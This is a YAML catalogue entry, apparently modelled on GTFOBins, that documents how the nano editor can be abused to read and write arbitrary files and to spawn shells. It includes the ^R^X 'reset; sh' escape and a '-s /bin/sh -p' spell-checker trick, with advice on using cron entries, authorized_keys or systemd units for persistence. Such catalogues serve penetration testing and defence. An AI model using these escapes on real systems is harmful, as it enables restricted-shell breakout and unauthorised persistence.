---
name: nano
capabilities:
- exec
- spawn
- read
- write
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: nano /path/to/input-file
  notes: The file content is displayed in the terminal interface.
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: |-
    nano /path/to/output-file
    DATA
    ^O
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    nano
    ^R^X
    reset; sh 1>&0 2>&0
- id: shell-2
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    nano -s '/bin/sh -p'
    /bin/sh -p
    ^T^T
  notes: The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
references:
- https://gtfobins.github.io/gtfobins/nano/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
